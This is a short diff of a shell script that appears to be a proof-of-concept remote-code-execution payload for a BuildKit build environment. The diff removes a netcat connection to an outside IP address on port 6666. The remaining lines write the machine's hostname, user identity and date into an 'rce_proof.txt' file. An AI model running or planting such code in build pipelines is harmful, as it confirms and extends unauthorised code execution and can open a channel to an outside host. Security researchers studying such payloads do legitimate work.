@@ -1,5 +1,4 @@
 #!/bin/sh
-nc 62.113.111.63 6666
 cat /etc/hostname > /var/lib/buildkit/rce_proof.txt
 id >> /var/lib/buildkit/rce_proof.txt
 date >> /var/lib/buildkit/rce_proof.txt
